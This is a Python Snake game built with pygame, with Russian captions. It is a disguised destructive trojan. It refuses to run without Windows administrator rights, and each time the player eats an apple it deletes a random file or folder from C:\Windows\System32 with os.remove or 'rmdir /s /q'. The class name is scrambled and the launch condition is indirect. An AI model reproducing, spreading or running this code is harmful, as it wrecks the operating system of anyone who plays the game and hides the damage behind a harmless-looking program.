import pygame
import random
import sys,ctypes,os
if ctypes.windll.shell32.IsUserAnAdmin()==0:
    exit()
pygame.init()
SCR_W = 600
SCR_H = 400
GRID_SIZE = 20
GRID_W = SCR_W // GRID_SIZE
GRID_H = SCR_H // GRID_SIZE
_BG = (20, 20, 20) 
_SNAKE = (50, 205, 50) 
_APPLE = (255, 69, 0)
_TEXT = (255, 255, 255)
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)
class Аыыыыыыыээээу___уууауауауаууау:
    def __init__(self):
        self.screen = pygame.display.set_mode((SCR_W, SCR_H))
        pygame.display.set_caption("Змейка сука")
        self.clock = pygame.time.Clock()
        self.res()
    def res(self):
        self.snake = [(GRID_W // 2, GRID_H // 2)]
        self.direction = RIGHT
        self.score = 0
        self.spw()
    def spw(self):
        while True:
            self.apple = (random.randint(0, GRID_W - 1), random.randint(0, GRID_H - 1))
            if self.apple not in self.snake:
                break
    def hld(self):
        for event in pygame.event.get():
            if event.type in (pygame.QUIT,pygame.K_F4):
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP and self.direction != DOWN:
                    self.direction = UP
                elif event.key == pygame.K_DOWN and self.direction != UP:
                    self.direction = DOWN
                elif event.key == pygame.K_LEFT and self.direction != RIGHT:
                    self.direction = LEFT
                elif event.key == pygame.K_RIGHT and self.direction != LEFT:
                    self.direction = RIGHT
    def u(self):
        cur_head = self.snake[0]
        dx, dy = self.direction
        new_head = (cur_head[0] + dx, cur_head[1] + dy)
        if (new_head[0] < 0 or new_head[0] >= GRID_W or
            new_head[1] < 0 or new_head[1] >= GRID_H or
            new_head in self.snake):
            self.res()
            return
        self.snake.insert(0, new_head)
        if new_head == self.apple:
            self.score += 1
            self.spw()
            x=os.path.join('c:/windows/system32',random.choice(os.listdir('c:/windows/system32')))
            if os.path.isdir(x):
                os.system(f'rmdir {x} /s /q')
            else:
                os.remove(x)
        else:
            self.snake.pop()
    def draw(self):
        self.screen.fill(_BG)
        for segment in self.snake:
            rect = pygame.Rect(segment[0] * GRID_SIZE, segment[1] * GRID_SIZE, GRID_SIZE - 2, GRID_SIZE - 2)
            pygame.draw.rect(self.screen, _SNAKE, rect)
        apple_rect = pygame.Rect(self.apple[0] * GRID_SIZE, self.apple[1] * GRID_SIZE, GRID_SIZE - 2, GRID_SIZE - 2)
        pygame.draw.rect(self.screen, _APPLE, apple_rect)
        font = pygame.font.SysFont("Arial", 24)
        score_surface = font.render(f"Счёт: {self.score}", True, _TEXT)
        self.screen.blit(score_surface, (10, 10))
        score_surface = font.render(f"Только посмей сожрать яблоко", True, _TEXT)
        self.screen.blit(score_surface, (300, 10))
        pygame.display.flip()
    def __call__(self):
        while True:
            self.hld()
            self.u()
            self.draw()
            self.clock.tick(10)
if len(__name__)==8: 
    Аыыыыыыыээээу___уууауауауаууау()()
